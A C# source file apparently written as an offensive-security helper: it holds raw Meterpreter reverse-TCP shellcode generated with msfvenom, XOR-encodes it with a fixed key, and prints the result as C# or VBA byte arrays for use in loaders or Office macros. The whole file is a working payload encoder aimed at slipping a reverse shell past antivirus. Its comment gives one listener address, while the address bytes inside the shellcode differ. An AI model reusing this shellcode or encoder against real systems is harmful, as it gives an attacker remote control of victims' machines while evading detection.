﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XorCoder
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[375] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
0x8b,0x52,0x14,0x31,0xff,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,
0x01,0xd0,0x57,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,0x85,0xc9,0x74,
0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,
0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,
0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,
0x6a,0x0a,0x68,0xc0,0xa8,0x2d,0xf8,0x68,0x02,0x00,0x01,0xbb,
0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,
0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,
0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,
0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,
0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,
0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,
0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,
0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,
0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,
0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,
0xc1,0xc3,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,
0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5};

            // Encode the payload with XOR (fixed key)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex;

            if (args.Length > 0)
            {
                switch (args[0])
                {
                    case "-VBA":
                        // Printout VBA payload
                        uint counter = 0;

                        hex = new StringBuilder(encoded.Length * 2);
                        foreach (byte b in encoded)
                        {
                            hex.AppendFormat("{0:D}, ", b);
                            counter++;
                            if (counter % 50 == 0)
                            {
                                hex.AppendFormat("_{0}", Environment.NewLine);
                            }
                        }
                        Console.WriteLine("The VBA payload is: " + hex.ToString());
                        break;
                    default:
                        Console.WriteLine("The valid optional parameter is -VBA to printout VBA payload");

                        break;
                }
            }
            else
            {
                // Printout C# payload
                hex = new StringBuilder(encoded.Length * 2);
                int totalCount = encoded.Length;
                for (int count = 0; count < totalCount; count++)
                {
                    byte b = encoded[count];

                    if ((count + 1) == totalCount) // Dont append comma for last item
                    {
                        hex.AppendFormat("0x{0:x2}", b);
                    }
                    else
                    {
                        hex.AppendFormat("0x{0:x2}, ", b);
                    }

                    if ((count + 1) % 15 == 0)
                    {
                        hex.Append("\n");
                    }
                }

                Console.WriteLine($"XOR payload (key: 0xfa):");
                Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
            }




            // Decode the XOR payload
            /*
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            */

        }
    }
}